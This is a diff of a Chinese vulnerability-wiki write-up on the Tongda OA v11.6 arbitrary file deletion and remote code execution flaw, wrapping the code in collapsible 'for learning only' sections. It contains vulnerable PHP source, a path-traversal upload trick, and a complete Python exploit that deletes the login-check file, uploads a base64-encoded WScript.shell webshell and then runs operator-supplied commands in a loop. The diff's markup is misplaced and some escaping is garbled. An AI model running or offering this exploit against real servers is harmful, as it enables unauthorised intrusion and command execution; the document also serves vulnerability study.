@@ -22,8 +22,10 @@ tags:
 
 ```
 通达OA v11.6
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 环境搭建
 
 [通达OA v11.6下载链接](https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe)
@@ -39,7 +41,7 @@ tags:
 解密完成后查看 **webroot\general\data_center\utils\upload.php** 文件
 
 ```php
-<?php
+&lt;?php
 
 include_once "inc/auth.inc.php";
 include_once "./utils.func.php";
@@ -96,7 +98,7 @@ if ($action == "upload") {
 		}
 
 		if (isset($from_rep)) {
-			if (($from_rep != "") && ($from_rep[0] == "{")) {
+			if (($from_rep != "") &amp;&amp; ($from_rep[0] == "{")) {
 				$repkid = GetRepKIDBySendId($from_rep);
 
 				if ($repkid != $to_rep) {
@@ -108,7 +110,7 @@ if ($action == "upload") {
 			else {
 				$arr = explode(",", $from_rep);
 
-				for ($i = 0; $i < count($arr); $i++) {
+				for ($i = 0; $i &lt; count($arr); $i++) {
 					$p = strpos($arr[$i], ".");
 					$repno = substr($arr[$i], 0, $p);
 					$repkid = GetRepKIDByNo($repno);
@@ -165,17 +167,20 @@ echo "new_name:'$s_n',\n";
 echo "error: '" . $error . "',\n";
 echo "msg: '" . $msg . "'\n";
 echo "}";
-echo "<body>\r\n</body>\r\n</html>";
+echo "&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;";
 
-?>
-```
+?&gt;</code></pre>
+
+</details>
 
 在第一行包含了文件 **auth.inc.php**
 
 ```php
 include_once "inc/auth.inc.php";
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ![image-20220209105907490](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091059689.png)
 
 可以看到这个文件用于检验是否登录，未登录的情况无法利用这个漏洞
@@ -185,10 +190,10 @@ include_once "inc/auth.inc.php";
 ![image-20220209105939041](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091059191.png)
 
 ```php
-<?php
+&lt;?php
 
 $s_tmp = __DIR__ . "/../../../../logs/appbuilder/logs";
-$s_tmp .= "/" . $_GET["guid"];
+$s_tmp .= "/" . &#36;_GET["guid"];
 
 if (file_exists($s_tmp)) {
 	$arr_data = unserialize(file_get_contents($s_tmp));
@@ -198,8 +203,9 @@ if (file_exists($s_tmp)) {
 else {
 	echo "未知参数";
 	exit();
-}
-```
+}</code></pre>
+
+</details>
 
 这里可以看到 页面获取 guid参数的值
 使用**file_exists函数**判断文件是否存在 并未进行校验 就执行unlink删除文件
@@ -282,11 +288,13 @@ else {
 			if (move_uploaded_file($_FILES["FILE1"]["tmp_name"], $uploaddir . $s_n)) {
 			}
 		}
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 这里直接将 **$repkid** 变量进行拼接,也就是说可以通过目录穿越来上传恶意文件到指定目录
 
-这里需要利用file_exists函数的漏洞构造/.<>./.<>./.<>./ 逃逸出来
+这里需要利用file_exists函数的漏洞构造/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./ 逃逸出来
 
 使用POC来利用漏洞
 
@@ -314,10 +322,10 @@ import sys
 def title():
     print('+------------------------------------------')
     print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
-    print('+  \033[34mVersion: 通达OA v11.6 任意文件删除&RCE                                \033[0m')
+    print('+  \033[34mVersion: 通达OA v11.6 任意文件删除&amp;RCE                                \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                           \033[0m')
-    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx                                 \033[0m')
-    print('+  \033[36mCmd    >>> whoami                                                 \033[0m')
+    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                 \033[0m')
+    print('+  \033[36mCmd    &gt;&gt;&gt; whoami                                                 \033[0m')
     print('+------------------------------------------')
 
 def POC_1(target_url):
@@ -325,7 +333,7 @@ def POC_1(target_url):
     try:
         check_url_response  = requests.get(url = check_url)
         if check_url_response.status_code == 200:
-            print("\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除&RCE漏洞\033[0m")
+            print("\033[32m[o] 存在 /module/appbuilder/assets/print.php 可能含有通达OA v11.6 任意文件删除&amp;RCE漏洞\033[0m")
             input("\033[32m[o] 此漏洞会对真实环境造成影响，请在授权的情况下利用此漏洞，按下任意键继续..... \033[0m")
         else:
             print("\033[31m[x] 不存在 /module/appbuilder/assets/print.php 漏洞利用失败 \033[0m")
@@ -350,16 +358,16 @@ def POC_2(target_url):
 def POC_3(target_url, payload_php):
     """
       (绕过的webshell)
-      <?php
-      $command=$_GET['test'];
+      &lt;?php
+      $command=&#36;_GET['test'];
       $wsh = new COM('WScript.shell');
-      $exec = $wsh->exec("cmd /c ".$command);
-      $stdout = $exec->StdOut();
-      $stroutput = $stdout->ReadAll();
+      $exec = $wsh-&gt;&#101;xec("cmd /c ".$command);
+      $stdout = $exec-&gt;StdOut();
+      $stroutput = $stdout-&gt;ReadAll();
       echo $stroutput;
-      ?>
+      ?&gt;
     """
-    vuln_url = target_url + "/general/data_center/utils/upload.php?action=upload&filetype=test&repkid=/.<>./.<>./.<>./"
+    vuln_url = target_url + "/general/data_center/utils/upload.php?action=upload&amp;filetype=test&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./"
     files = {'FILE1': ('test.php', payload_php)}
     try:
         vuln_response = requests.post(url = vuln_url,files=files)
@@ -389,19 +397,20 @@ def POC_4(target_url, cmd):
 
 if __name__ == '__main__':
     title()
-    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
+    target_url = str(input("\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m"))
     POC_1(target_url)
     POC_2(target_url)
-    payload_php = base64.b64decode("PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=").decode("utf-8")
+    payload_php = &#98;ase64.&#98;64decode("PD9waHAKICAgICRjb21tYW5kPSRfR0VUWyd0ZXN0J107CiAgICAkd3NoID0gbmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOwogICAgJGV4ZWMgPSAkd3NoLT5leGVjKCJjbWQgL2MgIi4kY29tbWFuZCk7CiAgICAkc3Rkb3V0ID0gJGV4ZWMtPlN0ZE91dCgpOwogICAgJHN0cm91dHB1dCA9ICRzdGRvdXQtPlJlYWRBbGwoKTsKICAgIGVjaG8gJHN0cm91dHB1dDsKPz4=").decode("utf-8")
     POC_3(target_url, payload_php)
 
     while True:
-        cmd = input("\033[35mCmd >>> \033[0m")
+        cmd = input("\033[35mCmd &gt;&gt;&gt; \033[0m")
         if cmd == "exit":
             sys.exit(0)
         else:
-            POC_4(target_url, cmd)
-```
+            POC_4(target_url, cmd)</code></pre>
+
+</details>
 
 ![image-20220209110115108](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091101200.png)
 
